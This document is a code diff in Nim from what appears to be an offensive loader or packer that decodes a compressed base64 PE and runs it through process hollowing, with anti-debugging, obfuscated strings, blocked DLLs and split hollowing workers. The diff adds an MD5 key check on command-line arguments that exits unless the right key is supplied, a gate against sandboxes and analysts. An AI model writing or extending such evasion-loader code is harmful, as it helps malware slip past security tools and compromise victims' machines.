@@ -4,6 +4,7 @@ import params
 import antidebug
 # External
 import os
+import md5
 import winim
 import strutils
 import nimprotect
@@ -29,14 +30,34 @@ void raiseVEH() {
 """.}
 proc raiseVEH(): void {.importc: protectString("raiseVEH"), nodecl.}
 
+
+proc validateKey(commandLineParams: seq[string]) = 
+    var pass = false
+    for arg in commandLineParams:
+        if keyMd5 == getMd5(arg):
+            pass = true
+            break
+    if not pass:
+        quit(1)
+
+
 proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
+    
+    # Check if key in command line
+    let commandLineParams = commandLineParams()
+    if keyMd5 != "":
+        when defined(hollow4) or defined(hollow5) or defined(hollow6):
+            if protectString("-M") in commandLineParams:
+                validateKey(commandLineParams)
+        else:
+            validateKey(commandLineParams)
+
     # Decode and decompress PE
     var compressedPe = decode(compressedBase64PE)
     var peStr = uncompress(compressedPe)
 
     # Check hollowsplitted args 
     when defined(hollow4) or defined(hollow5) or defined(hollow6):
-        let commandLineParams = commandLineParams()
         for i in commandLineParams:
             if i.startsWith(protectString("-A:")) or i.startsWith(protectString("-W:")) or i.startsWith(protectString("-T:")) or i.startsWith(protectString("-R:")):
                 # This is a worker process in splitted hollow, let it go
